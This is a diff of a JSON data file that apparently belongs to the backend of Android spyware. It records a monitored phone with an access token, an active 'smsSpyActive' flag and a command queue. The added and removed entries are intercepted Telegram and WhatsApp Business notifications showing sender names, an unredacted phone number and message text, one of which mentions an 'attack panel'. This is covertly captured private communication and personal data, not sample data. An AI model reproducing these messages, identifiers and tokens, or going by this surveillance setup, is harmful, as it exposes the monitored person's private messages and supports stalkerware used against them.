@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775637047455,
+    "lastSeen": 1775637050675,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: Gok",
+        "content": "Cara pakai attack panel gimana",
+        "time": "08/04 15:30",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637051784
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Pin brp",
+        "time": "08/04 15:30",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637051746
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "15 new messages from 13 chats",
+        "time": "08/04 15:30",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637051594
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 857-8951-4723",
+        "content": "Ya",
+        "time": "08/04 15:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637047791
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
@@ -4294,38 +4326,6 @@
         "time": "08/04 14:39",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633988955
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "JDI? BELIK YANG MN?",
-        "time": "08/04 14:39",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633961244
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 14:39",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633961067
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "13 new messages from 12 chats",
-        "time": "08/04 14:39",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633960887
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "JDI? BELIK YANG MN?",
-        "time": "08/04 14:39",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633958317
       }
     ],
     "galleryPhotos": [],
